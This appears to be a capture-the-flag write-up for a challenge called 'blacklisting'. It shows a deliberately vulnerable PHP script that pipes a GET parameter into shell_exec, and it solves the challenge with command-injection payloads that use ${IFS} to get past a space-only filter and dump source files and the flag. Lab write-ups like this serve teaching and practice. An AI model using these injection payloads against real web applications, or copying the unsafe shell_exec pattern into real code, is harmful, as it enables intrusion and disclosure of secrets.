# blacklisting

When we open the instance we see this:
```php
 <?php
require __DIR__ . '/secrets.php';
if (!isset($_GET['start'])){
    show_source(__FILE__);
    exit;
} 
$value = $_GET['secrets'];
if (strpos($value, ' ') !== false) {
  exit;
}
$cmd = "/usr/bin/find . ".$value;
echo shell_exec($cmd);
?>
```

From my understaning of the code is that we need a param named `start` and also a param named `secrets` where we will put our input.
The param named `secrets` is checked to not have spaces (so we can not do input injection or something).

The first thing I tried was: `/?start&secrets=;ls` and I saw ./index.php and ./secrets.php twice. So yeah we can execute commands.
Since the checker only looks for the space char we can use the `${IFS}` char that allows us to use the space char without using the space char.

So my payload was: `/?start&secrets=;tac${IFS}*`
The output:
```
. ./index.php ./secrets.php ?> echo shell_exec($cmd); $cmd = "/usr/bin/find . ".$value; } exit; if (strpos($value, ' ') !== false) { $value = $_GET['secrets']; } exit; show_source(__FILE__); if (!isset($_GET['start'])){ require __DIR__ . '/secrets.php'; } echo "CTF{3b2ceb0403300535fcd4808e8cbdb3cc3bd8f8b674527adce2915467f182faa4}"; function get_flag() { 
```

flag: `CTF{3b2ceb0403300535fcd4808e8cbdb3cc3bd8f8b674527adce2915467f182faa4}`